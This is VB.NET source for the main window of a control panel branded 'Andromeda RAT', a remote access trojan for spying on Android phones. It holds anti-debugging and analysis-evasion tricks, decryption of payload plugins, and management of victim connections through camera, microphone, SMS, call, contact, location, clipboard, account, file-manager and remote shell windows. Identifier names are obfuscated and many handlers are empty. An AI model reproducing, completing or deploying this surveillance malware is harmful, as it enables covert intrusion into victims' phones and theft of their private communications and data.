Imports System.ComponentModel
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading

Public Class Frm_Main
    Public Shared Enable_Language As Boolean
    Public Shared key_scripts As String
    Public gzcbuepcuoyvpagiuyodBxMzfyvbndCbiBynuatyszgdMuiNcw As Integer
    Public yCpqppBVvMbwoVpbzNvvixboiuCiuozzdgCayVsuBvmpxumVxq As sockets.Frm_Config_Accept
    Private RowsToolTip As Frm_Config_AndromedaScript
    Private Myname As String = "Andromeda RAT"
    Public Alive As Boolean = True
    Public Shared ISDB As Boolean = True
    Public Shared MyStatus As UInteger = 1
    Private StatusPanelPaintEventArgsWait As Boolean = False
    Public APPDOM As AppDomain = Nothing
    Private EventArgsActivated As Boolean = False
    Dim Mx As Integer
    Dim Min As Integer
    Dim Sw As Integer
    Dim Sh As Integer
    Dim mov As Boolean
    Public Shared _ports As String = Nothing
    Public Shared OpenPortsValidade As Boolean

    <DllImport("user32.dll")>
    Public Shared Function FindWindow(ByVal strclassName As String, ByVal strWindowName As String) As IntPtr
    End Function
    <DllImport("Kernel32.dll")>
    Public Shared Function OutputDebugString(ByVal Txt As String) As IntPtr
    End Function
    <DllImport("Ntdll.dll")>
    Public Shared Function NtSetInformationThread(ByVal hThread As IntPtr, ByVal ThreadInformationClass As Integer, ByVal ThreadInformation As IntPtr, ByVal ThreadInformationLength As UInteger) As UInteger
    End Function
    <DllImport("Kernel32.dll")>
    Public Shared Function GetCurrentThread() As IntPtr
    End Function
    Public Sub TrocarPainelBuild(ByVal Painel As Form)
        PanelBuild.Controls.Clear()
        Painel.TopLevel = False
        PanelBuild.Controls.Add(Painel)
        Painel.Show()
    End Sub
    Public Shared Function HDB() As UInteger
        MyStatus = NtSetInformationThread(GetCurrentThread(), 17, Nothing, 0)
        If MyStatus <> 0 Then
            MsgBox("Error : X00101", MyStatus)
            Debugger.Break()
            Return 0
        Else
            ISDB = False
            Return 1
        End If
    End Function
    Sub New()
        InitializeComponent()
        SCANER = New Frm_Config_ComputerInfo
        sockets.Data.angelform = Me

    End Sub
    Private Sub NotifyI()

    End Sub
    Public Const WM_NCLBUTTONDOWN As Integer = &HA1
    Public Const HT_CAPTION As Integer = &H2
    <DllImportAttribute("user32.dll")>
    Public Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    End Function
    <DllImportAttribute("user32.dll")>
    Public Shared Function ReleaseCapture() As Boolean
    End Function
    Private Sub SpyStyle()
    End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles OpacityApp.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.OpacityApp.Enabled = False
        End If
    End Sub
    Private Function WaitServer() As Task
        While yCpqppBVvMbwoVpbzNvvixboiuCiuozzdgCayVsuBvmpxumVxq Is Nothing
            Threading.Thread.Sleep(100)
        End While
        Return Nothing
    End Function
    Delegate Sub delelabel1(objs As Object())
    Public Sub label1text(objs As Object())

    End Sub
    Public reset As Boolean = False

    Private Async Sub AngelAndroidForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If Enable_Language = True Then
            Try
                OpenPortsValidade = True
                Label_DesktopName.Text = My.Computer.Name
                Dim BuildForm As New 感语十间不谢语字外方伙我传这的词种答非说肉么么文余价思肉个么
                TrocarPainelBuild(BuildForm)
                Dim identity = Security.Principal.WindowsIdentity.GetCurrent()
                Dim principal = New Security.Principal.WindowsPrincipal(identity)
                Dim isElevated As Boolean = principal.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator)
                If isElevated Then
                    Dim updater As Thread = New Thread(Sub()
                                                           While Alive
                                                               Try
                                                                   Threading.Thread.Sleep(80)
                                                                   label1text(New Object() {sockets.Data.label1data})
                                                                   If reset Then
                                                                       reset = False
                                                                       Threading.Thread.Sleep(3000)
                                                                   End If
                                                               Catch ex As Exception
                                                               End Try
                                                           End While
                                                       End Sub)
                    updater.IsBackground = True
                    updater.Start()
                    If Not IamSingle() Then
                        MsgBox("only one instance of application allowed...")
                        FormEventArgsClosing()
                    End If
                    SpyStyle()
                    Me.Icon = My.Resources.max
                    Me.Text = String.Format("")
                    RowsToolTip = New Frm_Config_AndromedaScript
                    Dim FileDirectory As New IO.DirectoryInfo(Frm_Config_Settings.res_Path & "\Plugins\Android")
                    Dim plug As IO.FileInfo() = FileDirectory.GetFiles("*.pl")
                    Dim plugExi As String() = "gen-1.pl,gen-2.pl,gen-3.pl,gen-4.pl,gen-5.pl,gen-6.pl,gen-7.pl,gen-8.pl".Split({","}, StringSplitOptions.None)
                    Dim missing As Boolean = False
                    For Each n In plugExi
                        Dim pathTest As String = String.Format("{0}\{1}", FileDirectory.FullName, n)
                        If Not IO.File.Exists(pathTest) Then
                            missing = True
                            MsgBox(String.Format("Missing :{0}", pathTest), MsgBoxStyle.Critical, Frm_Config_Settings.nameRAT)
                        End If
                    Next
                    If missing Then
                        FormEventArgsClosing()
                    End If
                    Frm_Config_Settings.plug = New List(Of Object)
                    Dim PU2 As Array
                    Dim by2 As Byte()
                    For Each File As IO.FileInfo In plug
                        If File.Name = "gen-4.pl" Or File.Name = "gen-5.pl" Or File.Name = "gen-1.pl" Then
                            by2 = IO.File.ReadAllBytes(File.FullName)
                            PU2 = {Frm_Config_Settings.domen & "." & Frm_Config_Settings.Generals(File.Name.Substring(0, File.Name.LastIndexOf("."))), CStr(plug.Length), "rm -r ", "dex", by2, "ping -c 1 -W 15 "}
                            Frm_Config_Settings.plug.Add(PU2)
                            Continue For
                        End If
                        Dim BY As Byte() = Frm_Config_Codes.DE(IO.File.ReadAllBytes(File.FullName), "spymax")
                        Dim PU As Array = {Frm_Config_Settings.domen & "." & Frm_Config_Settings.Generals(File.Name.Substring(0, File.Name.LastIndexOf("."))), CStr(plug.Length), "rm -r ", "dex", BY, "ping -c 1 -W 15 "}
                        Frm_Config_Settings.plug.Add(PU)
                    Next
                    If My.Settings._multi_sounds = "Yes" Then
                        Notif_Sound.multi = True
                    Else
                        Notif_Sound.multi = False
                    End If
                    If Enable_Language = True Then
                    Else
                        Try
                            למоДלל得Яdתط动طנsХydiבc会וWב食רA英ظ(Authentication_users.decryptFile, key_scripts)
                        Catch ex As Exception
                            Application.Exit()
                        End Try
                    End If
                    If IO.File.Exists(Notif_Sound.path_File) Then
                        Notif_Sound.aMedia = New System.Media.SoundPlayer
                        Notif_Sound.aMedia.SoundLocation = Notif_Sound.path_File
                        Notif_Sound.aMedia.Load()
                    End If
                    Frm_Config_Settings.maps = New System.Text.StringBuilder
                    Frm_Config_Settings.maps.Append(IO.File.ReadAllText(Frm_Config_Settings.res_Path & "\Config\maps.inf"))
                    Dim WinMM As String = Frm_Config_Settings.MY_Path & "WinMM.Net.dll"
                    If Not IO.File.Exists(WinMM) Then
                        Throw New System.Exception("Missing :" & WinMM)
                    End If
                    Dim F0ntStyle As FontStyle = FontStyle.Regular
                    Dim ttFont As String = "Hack-Regular.ttf"
                    Select Case My.Settings.FontStyle
                        Case "Bold"
                            F0ntStyle = FontStyle.Bold
                            ttFont = "Hack-Bold.ttf"
                        Case "Regular"
                            F0ntStyle = FontStyle.Regular
                            ttFont = "Hack-Regular.ttf"
                    End Select
                    Dim F0ntSize As Integer = My.Settings.FontSize
                    Frm_Config_Settings.f = CustomFont.LoadFont(ttFont, F0ntSize, F0ntStyle)
                    Frm_Config_Settings.FontDrawString = CustomFontDrawString.LoadFont(ttFont, 11, F0ntStyle)
                    Frm_Config_Settings.SupportedText = IO.File.ReadAllText(Frm_Config_Settings.res_Path & "\Config\supported_text.inf").ToLower
                    Frm_Config_Settings.SupportedImages = IO.File.ReadAllText(Frm_Config_Settings.res_Path & "\Config\supported_images.inf").ToLower
                    Frm_Config_Settings.SupportedVideo = IO.File.ReadAllText(Frm_Config_Settings.res_Path & "\Config\supported_video.inf").ToLower

                    Me.OpacityApp.Interval = SpySettings.T_Interval
                    Me.OpacityApp.Enabled = True
                    Await Task.Factory.StartNew(Function() WaitServer(), TaskCreationOptions.None)
                    NotifyI()
                    Frm_Config_Settings.NewIcon(Frm_Config_Settings.res_Path & "\Icons\apk.ico", ".apk")
                    Dim thread As Thread = New Thread(AddressOf Bing)
                    thread.Start()
                    StatusPanelPaintEventArgsWait = True
                Else
                    Dim startInfo As New ProcessStartInfo()
                    Dim myprocess As New Process()
                    startInfo.FileName = Application.ExecutablePath
                    startInfo.Verb = "runas"
                    myprocess.StartInfo = startInfo
                    Try
                        myprocess.Start()
                    Catch ex As Exception
                    Finally
                        End
                    End Try
                End If
            Catch ex As Exception
                MsgBox(String.Format("{0}", ex.Message), MsgBoxStyle.Critical, Frm_Config_Settings.nameRAT)
                FormEventArgsClosing()
            End Try
        Else
            Application.Exit()
        End If
    End Sub

    Private Function IamSingle() As Boolean
        For Each p In Process.GetProcesses
            If p.ProcessName Is Process.GetCurrentProcess.ProcessName Then
                Return False
            End If
        Next
        Return True
    End Function
    Public Sub CypherStyle()
        Dim StyleColor As Color = FINDCOLOR(154, My.Resources.ARPolice, MyStatus)
        If StyleColor = Color.Green Then
            Return
        Else
            FormEventArgsClosing()
        End If
    End Sub
    Private Function FINDCOLOR(v As Integer, aRPolice As String, myStatus As UInteger) As Color
        If v >= 100 Then
            v = v - 100
            Dim Num = HDB()
            If Num = 1 Then
                Return Color.Green
            ElseIf Num = 0 Then
                FormEventArgsClosing()
            End If
        End If
    End Function
    Public Sub StartCheck()

    End Sub

    Private Sub AngelAndroidForm_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        FormEventArgsClosing()
    End Sub
    Public Sub FormEventArgsClosing()

    End Sub
    Private Sub notfi_MouseClick(sender As Object, e As MouseEventArgs)
        If e.Button = MouseButtons.Left Then
            If Not Me.WindowState = FormWindowState.Normal Then
                Me.WindowState = FormWindowState.Normal
            End If
            Me.TopMost = True
            Me.TopMost = False
        End If
    End Sub
    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub
    Public B As 感语十间不谢语字外方伙我传这的词种答非说肉么么文余价思肉个么
    Private Sub BuildToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If B Is Nothing Then
            B = New 感语十间不谢语字外方伙我传这的词种答非说肉么么文余价思肉个么
            Select Case B.ShowDialog(Me)
                Case DialogResult.OK
                    B.Close()
                    B = Nothing
                Case Else
                    B.Close()
                    B = Nothing
            End Select
        End If
    End Sub
    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs)
        FormEventArgsClosing()
    End Sub
    Public Workers() As BackgroundWorker
    Private NumWorkers = 0
    Public Sub Work()
        NumWorkers = NumWorkers + 1
        ReDim Workers(NumWorkers)
        Workers(NumWorkers) = New BackgroundWorker
        Workers(NumWorkers).WorkerReportsProgress = True
        Workers(NumWorkers).WorkerSupportsCancellation = True
        AddHandler Workers(NumWorkers).DoWork, AddressOf WorkerDoWork
        Workers(NumWorkers).RunWorkerAsync()
    End Sub
    Delegate Sub addLogback(objs As Object())
    Private Sub WorkerDoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs)

    End Sub
    Private Function PassToo() As Boolean
        Dim Ts = Frm_Main.FindWindow(Frm_Config_Codes.למоДלל得Яdתط动طנsХydiבc会וWב食רA英ظ("hmcL22ZmiVEfoXxpSK9U2g==", sockets.Data.THEKEY), Nothing)
        If Ts <> IntPtr.Zero Then
            MsgBox("Error")
            Environment.Exit(0)
        End If
        Dim Ts2 = Frm_Main.FindWindow("WinDbgFrameClass", Nothing)
        If Ts2 <> IntPtr.Zero Then
            MsgBox("Error")
            Environment.Exit(0)
        End If
        OutputDebugString("%s%s%s%s%s%s%s%s%s%s%s" +
                          "%s%s%s%s%s%s%s%s%s%s%s%s%s" +
                          "%s%s%s%s%s%s%s%s%s%s%s%s%s" +
                          "%s%s%s%s%s%s%s%s%s%s%s%s%s")
        Return True
    End Function
    Public SCANER As Frm_Config_ComputerInfo = Nothing
    Public Sub addLog(objs As Object())

    End Sub
    Public Sub UpdateForms(ByVal Card As Frm_Config_ClientCard)
        If Enable_Language = True Then
            Dim Forms As String = "null"
            For Each frm As Form In Application.OpenForms
                If frm IsNot Nothing AndAlso frm.Tag IsNot Nothing Then
                    Dim Target_CAM As New Frm_CameraManager
                    If frm.Tag.ToString = "Cam_" + Card.ClassClient.ClientAddressIP Then
                        Target_CAM = frm
                        Target_CAM.statustext.Text = "Client Reconnected , Please Select Camer..."
                        If Target_CAM.Changed Then
                            Target_CAM.Changed = False
                            If Not Target_CAM.classCamera Is Nothing Then
                                Target_CAM.classCamera.qit = True
                                Target_CAM.classCamera.Close(Target_CAM.CameraClient, "Camera Ended")
                            End If
                        End If
                        Target_CAM.Sbtn.Enabled = False
                        Target_CAM.Fbtn.Enabled = True
                        Target_CAM.Bbtn.Enabled = True
                        Target_CAM.Bbtn.Tag = "off"
                        Target_CAM.Fbtn.Tag = "off"
                    End If
                End If
                If frm IsNot Nothing AndAlso frm.Tag IsNot Nothing Then
                    If frm.Tag.ToString = Card.ClassClient.ClientAddressIP Then
                        Dim Target_form As New Frm_FileManager
                        Target_form = frm
                        Target_form.pathtxt.BackColor = Color.White
                        Target_form.Tag = Card.ClassClient.ClientAddressIP
                        Target_form.Name = "File_Manager_" & Card.ClassClient.ClientAddressIP
                        Target_form.Title = String.Format("{0} - IP:{1}", "File Manager", Card.ClassClient.ClientAddressIP)
                        Target_form.Text = String.Format("{0} - IP:{1}", "File Manager", Card.ClassClient.ClientAddressIP)
                        Target_form.Client = Card.ClassClient.myClient
                        Target_form.classClient = Card.ClassClient
                        Target_form.ver = Card.ClassClient.VersionClient
                        Target_form.DGV0.AutoGenerateColumns = False
                        Target_form.DGV0.Columns(5).DisplayIndex = 0
                        Target_form.Timer1.Start()
                        Target_form.viwimage.Image = Nothing
                        Exit For
                    End If
                End If
            Next
        End If

    End Sub
    Public Sub RemoveCard(ByVal Card As Frm_Config_ClientCard)
        If Me.InvokeRequired Then
            Me.Invoke(Sub() RemoveCard(Card))
            Exit Sub
        Else
            Try
                Dim Forms As String = "null"
                If Card IsNot Nothing Then
                    clientsflow.Controls.Remove(Card)
                End If
                If Not Forms = "null" Then
                    Dim handle As String = "Calls_Manager_" & Forms
                    Dim FM As Form = My.Application.OpenForms(handle)
                    Dim CS As String() = {"Close windows", "Disconnected ---> "}
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "SMS_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Contacts_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Camera_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    Try
                        handle = "File_Manager_" & CStr(Card.ClassClient.ClientAddressIP)
agin:
                        FM = My.Application.OpenForms(handle)
                        If FM IsNot Nothing Then
                            If Not FM.IsDisposed Then
                                Dim fm2 As Frm_FileManager = FM
                                If SpySettings.DISCONNECTED = CS(0) Then
                                    FM.Close()
                                Else
                                    Dim FTEXT As String = FM.Text
                                    FM.Text = CS(1) & FTEXT
                                    For Each Ro As DataGridViewRow In fm2.DGVDATA.Rows
                                        If Ro.Cells(4).Value = "Downloading.." Then
                                            Ro.Cells(4).Value = "Faild.."
                                            Ro.Tag = "x"
                                            Ro.DefaultCellStyle.ForeColor = Color.Red
                                        End If
                                    Next
                                End If
                            End If
                        End If
                    Catch ex As Exception
                        If Not handle = "File_Manager_" & Forms Then
                            handle = "File_Manager_" & Forms
                            GoTo agin
                        End If
                    End Try
                    handle = "Microphone_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "SM_Hunter_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            Dim FTEXT As String = FM.Text
                            FM.Text = CS(1) & FTEXT
                        End If
                    End If
                    handle = "Shell_Terminal_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Location_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Applications_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Account_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "informations_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbua_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Clipboard_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                End If
            Catch xErrors As Exception
            End Try
        End If
    End Sub
    Private Sub BoxTitle_Paint(sender As Object, e As PaintEventArgs)
    End Sub
    Public WU As Frm_Users
    Private Sub UsersToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If WU Is Nothing Then
            WU = New Frm_Users
            Dim users_ As String = Frm_Config_Settings.res_Path & "\Users"
            If IO.Directory.Exists(users_) Then
                Dim Dirs() As String = IO.Directory.GetDirectories(users_)
                For Each Dir As String In Dirs
                    Dim dr As New IO.DirectoryInfo(Dir)
                    Dim user_file As String = dr.FullName & "\user.info"
                    If IO.File.Exists(user_file) Then
                        Try
                            Dim Ln As String() = IO.File.ReadAllLines(user_file)
                            If Ln.Length = 3 Then
                                Dim getPath As String = Frm_Config_Settings.res_Path & "\Icons\FillEllipse\User.png"
                                WU.DGV0.Rows.Add(Ln(0), Ln(2) & " /ip:" & Ln(1), dr.Name, Frm_Config_Settings.GetEllImage(0, {getPath, 15, 15, 17, 17}))
                            End If
                        Catch ex As Exception
                        End Try
                    End If
                Next
            End If
            WU.DGV0.Columns(3).Width = Frm_Config_Settings.IconsSize
            WU.DGV0.Columns(3).DisplayIndex = 0
            WU.StartPosition = FormStartPosition.Manual
            WU.Location = Frm_Config_Codes.FixSize(Me, WU)
            WU.Show()
        End If
    End Sub

    Public Function SCANTHETIME() As String

    End Function


    Private Sub AngelAndroidForm_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Alive = False
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs)
        Me.Close()
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs)
#Disable Warning BC42025
        WindowState = WindowState.Minimized
#Enable Warning BC42025
    End Sub
    Private Sub Panel1_MouseDown(sender As Object, e As MouseEventArgs)
        If e.Button = Windows.Forms.MouseButtons.Left Then
            ReleaseCapture()
            SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
        End If
    End Sub
    Private CYPHERSETTNGS As Frm_MainSettings
    Private Sub Button3_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub Button4_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub Button5_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub StatusPanel_MouseDown(sender As Object, e As MouseEventArgs) Handles StatusPanel.MouseDown
        mov = True
        Min = MousePosition.Y
        Mx = MousePosition.X
        Sw = Width
        Sh = Height
    End Sub
    Private Sub StatusPanel_MouseMove(sender As Object, e As MouseEventArgs) Handles StatusPanel.MouseMove
        If mov Then
            Me.Height = MousePosition.Y - Min + Sh
        End If
    End Sub
    Private Sub StatusPanel_MouseUp(sender As Object, e As MouseEventArgs) Handles StatusPanel.MouseUp
        mov = False
    End Sub
    Dim temptext As String
    Dim temptext2 As String
    Private Sub Timer1_Tick(sender As Object, e As EventArgs)
        If temptext = Me.RcvText.Text Then
            Me.RcvText.Text = "Recebido " & "0" & " Bytes"
        Else
            temptext = Me.RcvText.Text
        End If
        If temptext2 = Me.SntText.Text Then
            Me.SntText.Text = "Enviado " & "0" & " Bytes"
        Else
            temptext2 = Me.SntText.Text
        End If
        Dim ary As Array = UploadDownload(yCpqppBVvMbwoVpbzNvvixboiuCiuozzdgCayVsuBvmpxumVxq.BytesSent, yCpqppBVvMbwoVpbzNvvixboiuCiuozzdgCayVsuBvmpxumVxq.BytesReceived)
        Me.RcvText.Text = "Recebido : " & ary.GetValue(0)
        Me.SntText.Text = "Enviado : " & ary.GetValue(1)
        Me.PortText.Text = "Porta : " + infoServer.PORTS
        Me.OnlinText.Text = "Client Online : " & CStr(clientsflow.Controls.Count)
        Thread.Sleep(1)
    End Sub
    Public Sub Bing()
        If Enable_Language = True Then
            While Alive
                Thread.Sleep(5000)
                If clientsflow.Controls.Count > 0 Then
                    Try
                        For Each card As Frm_Config_ClientCard In clientsflow.Controls
                            Dim claClient As sockets.Frm_Config_Client = card.ClassClient
                            If claClient IsNot Nothing Then
                                If claClient.Statistics IsNot "null" Then
                                    card.UpdateValue()
                                End If
                            End If
                        Next
                    Catch ex As Exception
                    End Try
                End If
            End While
        End If

    End Sub
    Private Sub Panel2_MouseDown(sender As Object, e As MouseEventArgs) Handles RightPanel.MouseDown
        mov = True
        Min = MousePosition.Y
        Mx = MousePosition.X
        Sw = Width
        Sh = Height
    End Sub
    Private Sub Panel2_MouseMove(sender As Object, e As MouseEventArgs) Handles RightPanel.MouseMove
        If mov Then
            Me.Width = MousePosition.X - Mx + Sw
        End If
    End Sub
    Private Sub Panel2_MouseUp(sender As Object, e As MouseEventArgs) Handles RightPanel.MouseUp
        mov = False
    End Sub
    Private Sub Button6_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub Clearbtn_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub Button7_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub LeftPanel_MouseDown(sender As Object, e As MouseEventArgs)
        If e.Button = Windows.Forms.MouseButtons.Left Then
            ReleaseCapture()
            SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
        End If
    End Sub
    Private Sub Button7_Click_1(sender As Object, e As EventArgs)
        Try
            Process.Start("https://web.telegram.org/k/#@Andromeda_RAT")
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button2_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub BuildToolStripMenuItem_Click_1(sender As Object, e As EventArgs)

    End Sub

    Private Sub SettingsToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub BuildToolStripMenuItem_Click_2(sender As Object, e As EventArgs)

    End Sub

    Private Sub SettingsToolStripMenuItem_Click_1(sender As Object, e As EventArgs)
        If CYPHERSETTNGS Is Nothing Then
            CYPHERSETTNGS = New Frm_MainSettings
            Select Case CYPHERSETTNGS.ShowDialog(Me)
                Case DialogResult.OK
                    CYPHERSETTNGS.Close()
                    CYPHERSETTNGS = Nothing
                Case Else
                    CYPHERSETTNGS.Close()
                    CYPHERSETTNGS = Nothing
            End Select
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs)
    End Sub

    Private Sub Guna2PictureBox1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub MenuStrip1_ItemClicked(sender As Object, e As ToolStripItemClickedEventArgs)

    End Sub

    Private Sub BuildClientToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Frm_SelecteBilder.Show(Me)
    End Sub

    Private Sub Guna2PictureBox1_Click_1(sender As Object, e As EventArgs)

    End Sub

    Private Sub PortText_Click(sender As Object, e As EventArgs) Handles PortText.Click

    End Sub

    Private Sub OnlinText_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub PanelMenu_Paint(sender As Object, e As PaintEventArgs) Handles PanelMenu.Paint

    End Sub

    Private Sub Guna2CirclePictureBox1_Click(sender As Object, e As EventArgs) Handles Guna2CirclePictureBox1.Click
        Application.Exit()
    End Sub
    Private Sub clientsflow_Paint(sender As Object, e As PaintEventArgs) Handles clientsflow.Paint

    End Sub

    Private Sub Guna2GradientButton4_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton4.Click
        If Enable_Language = True Then
            Guna2Transition1.Hide(PanelBuild)
            Guna2Transition1.Hide(PanelHome)
            Guna2Transition1.Hide(PanelPortSettings)
            Guna2Transition1.ShowSync(PanelClients)
        End If
    End Sub

    Private Sub Guna2Button1_Click_1(sender As Object, e As EventArgs)
    End Sub

    Private Sub PanelBuild_Paint(sender As Object, e As PaintEventArgs) Handles PanelBuild.Paint

    End Sub

    Private Sub Guna2GradientButton5_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton5.Click
        If Enable_Language = True Then
            Guna2Transition1.Hide(PanelClients)
            Guna2Transition1.Hide(PanelHome)
            Guna2Transition1.Hide(PanelPortSettings)
            Guna2Transition1.ShowSync(PanelBuild)
        End If

    End Sub

    Private Sub Guna2PictureBox5_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox5.Click

    End Sub

    Private Sub Guna2HtmlLabel28_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel28.Click

    End Sub

    Private Sub Guna2HtmlLabel32_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel32.Click

    End Sub

    Private Sub Guna2HtmlLabel36_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel36.Click

    End Sub

    Private Sub Guna2GradientPanel3_Paint(sender As Object, e As PaintEventArgs) Handles Guna2GradientPanel3.Paint

    End Sub

    Private Sub Guna2GradientPanel15_Paint(sender As Object, e As PaintEventArgs) Handles Guna2GradientPanel15.Paint

    End Sub

    Private Sub Guna2GradientPanel4_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2PictureBox21_Click(sender As Object, e As EventArgs)


    End Sub

    Private Sub Guna2HtmlLabel47_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel47.Click

    End Sub

    Private Sub Guna2HtmlLabel48_Click(sender As Object, e As EventArgs) Handles Label_DesktopUsername.Click

    End Sub

    Private Sub Guna2PictureBox27_Click(sender As Object, e As EventArgs)


    End Sub

    Private Sub Guna2HtmlLabel59_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel59.Click

    End Sub

    Private Sub Guna2PictureBox29_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox29.Click

    End Sub

    Private Sub Guna2HtmlLabel67_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel67.Click

    End Sub

    Private Sub Guna2PictureBox36_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox36.Click

    End Sub

    Private Sub Guna2GradientPanel6_Paint(sender As Object, e As PaintEventArgs) Handles Guna2GradientPanel6.Paint

    End Sub

    Private Sub Guna2HtmlLabel87_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel87.Click

    End Sub

    Private Sub Guna2HtmlLabel88_Click(sender As Object, e As EventArgs) Handles Android11_Red.Click

    End Sub

    Private Sub Guna2HtmlLabel97_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2GradientButton7_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton7.Click
        If Enable_Language = True Then
            Guna2Transition1.Hide(PanelBuild)
            Guna2Transition1.Hide(PanelClients)
            Guna2Transition1.Hide(PanelPortSettings)
